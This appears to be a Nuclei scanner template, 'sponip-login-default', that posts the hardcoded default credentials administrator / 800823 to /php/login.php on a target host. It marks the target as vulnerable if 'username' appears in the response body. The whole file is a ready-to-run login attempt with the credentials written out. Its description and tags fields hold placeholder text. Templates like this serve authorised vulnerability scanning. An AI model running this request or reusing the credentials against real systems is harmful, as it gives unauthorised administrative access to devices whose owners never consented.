id: sponip-login-default
info:
  name: sponip-login-default
  author: apple
  severity: high
  description: description
  reference:
    - https://xz.aliyun.com/t/10737#toc-14
  tags: tags
http:
  - raw:
      - |-
        POST /php/login.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Content-Length: 66
        Origin: http://{{Hostname}}
        Connection: close
        Referer: http://{{Hostname}}/index.html?t=0.6053178594707394
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0

        jsondata%5Busername%5D=administrator&jsondata%5Bpassword%5D=800823
    matchers:
      - type: word
        part: body
        words:
          - 'username'
